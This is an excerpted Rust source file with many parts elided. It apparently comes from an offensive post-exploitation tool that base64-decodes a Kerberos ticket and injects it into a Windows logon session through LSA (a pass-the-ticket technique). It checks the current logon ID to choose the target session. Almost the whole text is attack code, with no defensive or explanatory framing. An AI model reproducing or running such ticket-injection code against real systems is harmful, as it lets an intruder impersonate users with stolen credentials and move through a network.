...
fn base64_decode(input: &str) -> Option<Vec<u8>> {
    ...
    let mut i = 0;
    while i < input.len() {
        let a = b64_val(input[i]); i += 1;
        let b = if i < input.len() { b64_val(input[i]) } else { 0 }; i += 1;
        let c = if i < input.len() { b64_val(input[i]) } else { 0 }; i += 1;
        let d = if i < input.len() { b64_val(input[i]) } else { 0 }; i += 1;
...
fn get_current_luid(token: HANDLE) -> LUID {
    unsafe {
        ...
        if GetTokenInformation(
            ...
            core::mem::size_of::<TOKEN_STATISTICS>() as u32, &mut size,
        ) == 0
        {
...
fn main(args: *mut u8, len: usize) {
    ...
    let use_high = if current_luid.LowPart != target_luid.LowPart { false } else { high_integrity };
    ...
    unsafe {
        ...
        request.LogonId = if use_high { target_luid } else { LUID { LowPart: 0, HighPart: 0 } };

        core::ptr::copy_nonoverlapping(
            ticket_bytes.as_ptr(),
            submit_buf.as_mut_ptr().add(core::mem::size_of::<KERB_SUBMIT_TKT_REQUEST>()),
            ticket_bytes.len(),
        );
        ...
        let status = LsaCallAuthenticationPackage(
            hlsa, auth_package,
            submit_buf.as_ptr() as *const c_void, submit_size as u32,
